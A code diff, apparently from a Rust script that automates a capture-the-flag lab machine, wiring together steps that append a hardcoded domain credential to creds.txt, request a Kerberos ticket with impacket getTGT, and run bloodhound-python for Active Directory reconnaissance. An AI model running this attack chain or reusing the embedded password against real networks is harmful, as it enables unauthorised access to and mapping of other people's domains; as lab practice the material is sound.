@@ -2,7 +2,17 @@ use std::process::Command;
 use std::fs::{File, OpenOptions};
 use std::io::{Write, BufRead, BufReader, BufWriter};
 
-pub fn cheat_mode() {
+pub fn run() {
+    println!("Cheat mode activated....");
+    // grabed from test.exe but we cheating
+    println!("Adding stuff to creds.txt...");
+    cheat_mode();
+    println!("Grabbing new TGT...");
+    run_impacket_gettgt_third_user();
+    println!("Running Bloodhound...");
+    run_bloodhound_python();
+}
+fn cheat_mode() {
     let new_line = "m.lovegod:AbsoluteLDAP2022!";
 
     let file = OpenOptions::new()
@@ -15,7 +25,7 @@ pub fn cheat_mode() {
     writeln!(&mut file, "{}", new_line).expect("Unable to write data to file");
 }
 
-pub fn run_impacket_gettgt_third_user() {
+fn run_impacket_gettgt_third_user() {
     let input_path = "creds.txt";
     let file = File::open(input_path).expect("Unable to open file");
     let reader = BufReader::new(file);
@@ -51,7 +61,7 @@ pub fn run_impacket_gettgt_third_user() {
     }
 }
 
-pub fn run_bloodhound_python() {
+fn run_bloodhound_python() {
     let output = Command::new("bloodhound-python")
         .arg("-u")
         .arg("m.lovegod")
